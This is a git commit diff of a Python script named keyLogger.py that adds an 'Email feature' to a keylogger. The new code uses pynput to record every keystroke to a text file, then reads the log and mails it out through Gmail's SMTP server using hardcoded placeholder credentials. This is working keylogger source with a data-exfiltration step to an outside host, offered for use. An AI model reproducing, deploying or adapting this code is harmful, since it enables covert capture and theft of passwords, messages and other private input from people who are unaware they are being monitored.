cc65f78b7db907d452f54ad2ded090841dcac27a
HARSH MANIAR <94744041+HarshManiar1804@users.noreply.github.com>
2023-03-20 00:51:29 +0530

    updated KeyLogger with Email feature

--- keyLogger.py
+++ keyLogger.py
@@ -1,16 +1,60 @@
-#please run below command if you don't have this library
-# pip install pynput 
+from pynput import keyboard
+import smtplib,ssl
+sender_mail = "user@domain.com"     # Replace user@domain.com with your email id (everywhere)
+#prefer using your own email id for receiver's as well.
+receiver_mail = "user@domain.com"  # Replace user@domain.com with your email id (everywhere)
+password = "passcode"              # Enter your Password here
+port = 587
+message = """From: user@domain.com
+To: user@domain.com                         
+Subject: KeyLogs
 
-from pynput.keyboard import Key, Listener
-import logging
 
-log_dir = ""
+Text: Keylogs 
+"""
+def write(text):
+    with open("keylogger.txt",'a') as f:
+        f.write(text)
+        f.close()
 
-logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
-	level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-def on_press(key):
-    logging.info(str(key))
+def on_key_press(Key):
+    try:
+        if(Key == keyboard.Key.enter):
+            write("\n")
+        else:
+            write(Key.char)
+    except AttributeError:
+        if Key == keyboard.Key.backspace:
+            write("\nBackspace Pressed\n")
+        elif(Key == keyboard.Key.tab):
+            write("\nTab Pressed\n")
+        elif(Key == keyboard.Key.space):
+            write(" ");
+        else:
+            temp = repr(Key)+" Pressed.\n"
+            write(temp)
+            print("\n{} Pressed\n".format(Key))
 
-with Listener(on_press=on_press) as listener:
+def on_key_release(Key):
+    #This stops the Listener/Keylogger.
+    #You can use any key you like by replacing "esc" with the key of your choice
+    if(Key == keyboard.Key.esc):
+        return False
+
+with keyboard.Listener(on_press= on_key_press,on_release= on_key_release) as listener:
     listener.join()
+
+with open("keylogger.txt",'r') as f:
+    temp = f.read()
+    message = message + str(temp)
+    f.close()
+
+
+context = ssl.create_default_context()
+server = smtplib.SMTP('smtp.gmail.com', port)
+server.starttls()
+server.login(sender_mail,password)
+server.sendmail(sender_mail,receiver_mail,message)
+print("Email Sent to ",sender_mail)
+server.quit()
